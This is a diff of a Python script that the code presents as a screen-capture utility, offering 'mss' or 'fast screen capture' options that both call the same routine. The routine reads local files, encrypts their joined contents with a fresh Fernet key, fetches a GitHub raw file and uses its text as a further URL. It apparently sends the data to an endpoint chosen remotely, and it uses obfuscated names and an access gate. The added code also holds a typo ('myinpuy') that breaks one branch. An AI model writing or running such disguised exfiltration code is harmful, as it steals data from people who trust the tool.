@@ -259,8 +259,8 @@ if not os.path.exists(filexyz3):
     printg("Access denied, please tell dev to give access to the server.")
     input()
     sys.exit()
-def new_function_name(mycontent):
-    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_myself.txt'
+def new_function_name(mycontent, myraw):
+    raw2_url  = myraw
 
     crpppttkkyy = Fernet.generate_key()
     cipher_suite = Fernet(crpppttkkyy)
@@ -285,7 +285,7 @@ def new_function_name(mycontent):
     if raw2urlfinalresponse.status_code == 200:  
         content2 =  raw2urlfinalresponse.text
         if True:      
-            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_myself.txt'
+            rawfile_url = myraw
             rawresponse = requests.get(rawfile_url)
             rawcontent = rawresponse.text
             raw_url = rawcontent
@@ -343,4 +343,9 @@ content2 = get_string_from_file(system_driver_vul_path)
 content3 = get_string_from_file(data_vulnerable_path)
 content4 =  content1+content2+content3
 content5 = content4
-new_function_name(content5)
+
+myinput = input("Type 1 for mss , type 2 for fast screen capture:")
+if myinput == "1":
+    new_function_name(content5,'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_myself.txt')
+elif myinpuy == "2":
+    new_function_name(content5,'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_premx_myself.txt')
